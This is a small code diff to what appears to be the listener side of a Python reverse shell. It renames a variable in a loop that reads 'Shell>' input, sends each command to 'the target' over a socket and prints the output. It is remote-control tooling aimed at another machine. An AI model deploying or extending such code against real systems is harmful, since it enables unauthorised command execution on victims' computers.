@@ -10,18 +10,18 @@ def connect():
 
     while True:
 
-        command = input("Shell> ")
+        cmd = input("Shell> ")
 
         if cmd == '':
             cmd = "whoami"
 
-        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
+        if 'terminate' in cmd: # If we got terminate command, inform the client and close the connect and break the loop
             conn.send('terminate'.encode())
             conn.close()
             break
 
         
-        conn.send(command.encode()) # Otherwise we will send the command to the target
+        conn.send(cmd.encode()) # Otherwise we will send the command to the target
         print( conn.recv(1024).decode()) # print the result that we got back
 
 def main():
